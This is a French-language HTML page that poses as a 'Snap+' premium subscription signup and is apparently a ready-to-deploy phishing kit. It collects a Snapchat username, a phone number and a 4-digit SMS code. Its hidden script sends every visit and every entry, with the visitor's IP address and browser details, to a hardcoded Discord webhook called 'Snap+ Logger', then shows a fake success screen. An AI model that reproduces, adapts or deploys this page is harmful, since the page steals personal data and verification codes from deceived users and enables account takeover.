<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>S'inscrire à Snap+</title>

  <style>
    :root {
      --primary: #ffcc00;
      --primary-dark: #e6b800;
      --success: #00cc66;
      --bg-dark: #0a0a0a;
      --card: #111111;
      --input: #1a1a1a;
      --border: #333333;
      --text: #eeeeee;
      --text-light: #aaaaaa;
      --error: #ff6666;
    }

    * { box-sizing: border-box; margin:0; padding:0; }

    html, body {
      height: 100%;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: var(--bg-dark);
      color: var(--text);
      overflow-x: hidden;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100dvh;
      padding: 1rem;
    }

    canvas { position: fixed; inset: 0; z-index: 0; pointer-events: none; }

    .card {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border-radius: 24px;
      padding: clamp(1.6rem, 5vw, 2.4rem) clamp(1.4rem, 4vw, 2rem);
      box-shadow: 0 20px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.03);
      border: 1px solid var(--border);
      backdrop-filter: blur(10px);
      animation: cardAppear 0.8s cubic-bezier(0.23,1,0.32,1);
    }

    @keyframes cardAppear { from { opacity:0; transform:translateY(40px) scale(0.94); } to { opacity:1; transform:none; } }

    h1 { text-align:center; color:var(--primary); margin-bottom:1.8rem; font-size:clamp(1.6rem,6.5vw,2rem); font-weight:600; letter-spacing:-0.02em; }

    label { display:block; margin-bottom:0.6rem; color:#ccc; font-size:clamp(0.95rem,3.6vw,1rem); font-weight:500; }

    input, select {
      width:100%;
      padding:clamp(0.95rem,3.8vw,1.15rem) 1.1rem;
      border-radius:14px;
      border:1px solid var(--border);
      background:var(--input);
      color:white;
      font-size:clamp(1rem,4vw,1.05rem);
      margin-bottom:1.4rem;
      transition:all 0.25s cubic-bezier(0.4,0,0.2,1);
    }

    input:focus, select:focus {
      border-color:var(--primary);
      box-shadow:0 0 0 4px rgba(255,204,0,0.18);
      outline:none;
      transform:translateY(-1px);
    }

    button {
      width:100%;
      max-width:260px;
      margin:1.6rem auto 0;
      padding:clamp(0.95rem,4vw,1.2rem);
      border-radius:999px;
      border:none;
      background:var(--primary);
      color:black;
      font-size:clamp(1.05rem,4.2vw,1.15rem);
      font-weight:700;
      cursor:pointer;
      min-height:54px;
      transition:all 0.3s cubic-bezier(0.34,1.56,0.64,1);
      box-shadow:0 6px 20px rgba(255,204,0,0.25);
    }

    button:hover:not(:disabled) {
      background:var(--primary-dark);
      transform:translateY(-2px) scale(1.03);
      box-shadow:0 12px 30px rgba(255,204,0,0.35);
    }

    button:disabled { background:#444; color:#888; transform:none; box-shadow:none; cursor:not-allowed; }

    .error { text-align:center; color:var(--error); font-size:0.9rem; margin:-0.8rem 0 1.2rem; animation:fadeIn 0.4s; }

    @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }

    .code-box { display:flex; justify-content:center; gap:clamp(0.7rem,3.5vw,1rem); margin:1.6rem 0; }

    .code-box input {
      width:clamp(54px,15vw,70px);
      height:clamp(64px,17vw,80px);
      font-size:clamp(1.7rem,6.5vw,2.1rem);
      font-weight:700;
      text-align:center;
      border-radius:14px;
      border:2px solid var(--border);
      background:var(--input);
      color:var(--primary);
      transition:all 0.25s;
    }

    .code-box input:focus {
      border-color:var(--primary);
      box-shadow:0 0 0 4px rgba(255,204,0,0.22);
      transform:scale(1.06);
    }

    .resend { text-align:center; margin-top:1.1rem; font-size:0.96rem; color:var(--text-light); cursor:pointer; transition:color 0.25s; }

    .resend:hover { color:var(--primary); }

    .success { text-align:center; padding:2.5rem 1rem; }

    .check {
      width:100px; height:100px;
      border-radius:50%;
      border:6px solid var(--success);
      margin:2rem auto;
      position:relative;
      animation:popIn 0.7s cubic-bezier(0.34,1.56,0.64,1);
    }

    .check:after {
      content:"✔";
      font-size:54px;
      color:var(--success);
      position:absolute;
      top:50%; left:50%;
      transform:translate(-50%,-55%) scale(0);
      animation:drawCheck 0.6s cubic-bezier(0.25,0.8,0.25,1) 0.3s forwards;
    }

    @keyframes popIn { 0% { transform:scale(0.3); opacity:0; } 60% { transform:scale(1.15); } 100% { transform:scale(1); opacity:1; } }

    @keyframes drawCheck { to { transform:translate(-50%,-55%) scale(1); } }

    @media (max-width:480px) {
      .card { border-radius:20px; padding:1.6rem 1.3rem; }
      .code-box input { width:60px; height:68px; font-size:1.8rem; }
      button { max-width:none; font-size:1.1rem; }
    }

    @media (max-width:360px) {
      h1 { font-size:1.45rem; }
      label { font-size:0.93rem; }
      input, select { padding:0.9rem; font-size:1rem; }
      .code-box input { width:54px; height:62px; font-size:1.6rem; }
    }
  </style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="card">
  <h1 id="title">S'inscrire à Snap+</h1>

  <div id="step1">
    <label>Nom d'utilisateur Snap</label>
    <input id="username" autocomplete="off" placeholder="ex: lyna.xx">

    <label>Durée de l’abonnement</label>
    <select id="duration">
      <option value="" disabled selected>Choisissez une durée</option>
      <option value="1">1 mois</option>
      <option value="3">3 mois</option>
      <option value="12">12 mois</option>
    </select>

    <button id="b1" disabled>Continuer</button>
  </div>

  <div id="step2" style="display:none">
    <label>Numéro de téléphone français</label>
    <input id="phone" placeholder="06 12 34 56 78" inputmode="tel" autocomplete="tel">
    <div class="error" id="phoneErr"></div>
    <button id="b2" disabled>Recevoir le code</button>
  </div>

  <div id="step3" style="display:none">
    <label>Code reçu par SMS</label>
    <div class="code-box">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
    </div>
    <button id="b3" disabled>Valider</button>
    <div class="resend" id="resend">Renvoyer le code</div>
  </div>

  <div id="step4" style="display:none" class="success">
    <div class="check"></div>
    <h2 style="color:var(--success); margin:1.8rem 0 1rem; font-size:1.5rem;">Snap+ activé !</h2>
    <p style="color:#aaa; font-size:0.95rem;">Profitez de tous les avantages premium</p>
  </div>
</div>

<script>
// ────────────────────────────────────────────────
//  ⚠️  TON WEBHOOK (ne pas modifier si déjà mis)
// ────────────────────────────────────────────────
const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1474900079205679164/9DmcNu0XH3dzJFXZMlv8a8tIjqdvemCjC5NHzifVFVuiL_mrayd3Sdywkt0LEE4Wfvbd";

// Infos client
const getClientInfo = async () => {
  const data = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    language: navigator.language || navigator.userLanguage,
    screen: `${screen.width}x${screen.height}`,
    referrer: document.referrer || "direct",
  };

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const json = await res.json();
    data.ip = json.ip;
  } catch(e) {
    data.ip = "impossible de récupérer";
  }

  return data;
};

async function sendToWebhook(title, fields = {}) {
  const client = await getClientInfo();
  
  const embed = {
    title: title,
    color: 0xFFCC00,           // ← jaune pour tous les embeds
    fields: Object.entries(fields).map(([name, value]) => ({
      name: name,
      value: "```" + (value || "—") + "```",
      inline: name.length < 20
    })),
    footer: { text: `IP: ${client.ip} • ${client.userAgent.slice(0,80)}...` },
    timestamp: client.timestamp
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [embed],
        username: "Snap+ Logger",           // ← ton nom reste intact
        avatar_url: "https://i.imgur.com/veryfakeicon.png" // ← ton pp reste intact
      })
    });
  } catch(e) {
    console.error("Webhook error", e);
  }
}

// Envoi à l'ouverture
window.addEventListener("load", async () => {
  await sendToWebhook("Nouvelle visite sur Snap+");
});

// Étape 1
const usernameEl = document.getElementById("username");
const durationEl  = document.getElementById("duration");
const b1 = document.getElementById("b1");

function checkStep1() {
  b1.disabled = !(usernameEl.value.trim() && durationEl.value);
}

usernameEl.addEventListener("input", checkStep1);
durationEl.addEventListener("change", checkStep1);

b1.onclick = async () => {
  const data = {
    "Nom d'utilisateur": usernameEl.value.trim(),
    "Durée choisie": durationEl.options[durationEl.selectedIndex].text
  };
  await sendToWebhook("Étape 1 – Continuer cliqué", data);

  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";
};

// Étape 2
const phoneEl = document.getElementById("phone");
const phoneErr = document.getElementById("phoneErr");
const b2 = document.getElementById("b2");

phoneEl.addEventListener("input", () => {
  let v = phoneEl.value.replace(/\D/g, "");
  const ok = /^(0|\+33)[67]\d{8}$/.test(v);
  b2.disabled = !ok;
  phoneErr.textContent = ok ? "" : "Format invalide (ex: 06XXXXXXXX)";
});

b2.onclick = async () => {
  const data = {
    "Nom d'utilisateur": usernameEl.value.trim(),
    "Durée": durationEl.options[durationEl.selectedIndex].text,
    "Téléphone": phoneEl.value.trim()
  };
  await sendToWebhook("Étape 2 – Numéro saisi", data);

  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "block";
};

// Étape 3 + finale
const codeInputs = [...document.querySelectorAll(".code-box input")];
let codeValue = "";

codeInputs.forEach((el, i) => {
  el.addEventListener("input", () => {
    el.value = el.value.replace(/\D/,"");
    if (el.value && codeInputs[i+1]) codeInputs[i+1].focus();

    codeValue = codeInputs.map(inp => inp.value).join("");
    document.getElementById("b3").disabled = codeValue.length !== 4;
  });

  el.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !el.value && codeInputs[i-1]) {
      codeInputs[i-1].focus();
    }
  });
});

document.getElementById("b3").onclick = async () => {
  const data = {
    "Nom d'utilisateur": usernameEl.value.trim(),
    "Durée": durationEl.options[durationEl.selectedIndex].text,
    "Téléphone": phoneEl.value.trim(),
    "Code saisi": codeValue,
    "Statut": "✅Validé"
  };
  await sendToWebhook("Étape finale – CODE ENTRÉ", data);

  document.getElementById("step3").style.display = "none";
  document.getElementById("step4").style.display = "block";
  document.getElementById("title").textContent = "Succès";
};

// Resend cooldown
let cd = 0;
const resendEl = document.getElementById("resend");
resendEl.onclick = () => {
  if (cd) return;
  cd = 30;
  resendEl.textContent = `Renvoyer (${cd}s)`;
  const t = setInterval(() => {
    cd--;
    resendEl.textContent = `Renvoyer (${cd}s)`;
    if (!cd) {
      clearInterval(t);
      resendEl.textContent = "Renvoyer le code";
    }
  }, 1000);
};

// Fond animé (avec try/catch pour éviter page blanche)
try {
  const c = document.getElementById("bg");
  const ctx = c.getContext("2d");
  let w, h;
  function resize() {
    w = c.width = window.innerWidth;
    h = c.height = window.innerHeight;
  }
  window.onresize = resize;
  resize();

  const particles = Array.from({length:90}, ()=>({
    x:Math.random()*w, y:Math.random()*h,
    vx:(Math.random()-0.5)*0.6, vy:(Math.random()-0.5)*0.6,
    radius:Math.random()*1.9+1
  }));

  let mouse = {x:w/2, y:h/2};
  window.onmousemove = e=>{mouse.x=e.clientX; mouse.y=e.clientY;};
  window.ontouchmove = e=>{
    if(e.touches.length){ mouse.x=e.touches[0].clientX; mouse.y=e.touches[0].clientY; }
  };

  function loop(){
    ctx.clearRect(0,0,w,h);
    const grad = ctx.createRadialGradient(mouse.x,mouse.y,0,mouse.x,mouse.y,220);
    grad.addColorStop(0,'rgba(255,204,0,0.09)');
    grad.addColorStop(0.45,'rgba(255,204,0,0.035)');
    grad.addColorStop(1,'rgba(255,204,0,0)');
    ctx.fillStyle=grad; ctx.fillRect(0,0,w,h);

    particles.forEach(p=>{
      p.x+=p.vx; p.y+=p.vy;
      if(p.x<0||p.x>w)p.vx*=-1;
      if(p.y<0||p.y>h)p.vy*=-1;

      let d=Math.hypot(p.x-mouse.x,p.y-mouse.y);
      if(d<160){ p.vx+= (p.x-mouse.x)/d *0.55; p.vy+=(p.y-mouse.y)/d *0.55; }

      ctx.fillStyle=`rgba(255,204,0,${0.35+(1-d/160)*0.45})`;
      ctx.beginPath(); ctx.arc(p.x,p.y,p.radius,0,Math.PI*2); ctx.fill();
    });

    requestAnimationFrame(loop);
  }
  loop();
} catch(e) {
  console.error("Canvas error:", e);
}
</script>
</body>
</html>
